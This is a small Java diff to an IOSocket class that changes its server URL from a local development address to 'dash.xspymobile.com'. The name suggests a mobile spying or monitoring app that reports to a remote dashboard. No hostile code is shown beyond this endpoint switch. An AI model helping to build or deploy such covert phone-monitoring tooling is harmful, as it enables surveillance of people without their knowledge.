@@ -38,8 +38,8 @@ public class IOSocket {
     }
 
     public static String getUrl() {
-        //return "https://dash.xspymobile.com";
-        return "http://192.168.0.3:5000";
+        return "https://dash.xspymobile.com";
+       // return "http://192.168.0.2:5000";
     }
 
     public void send(String method, Object... args) {
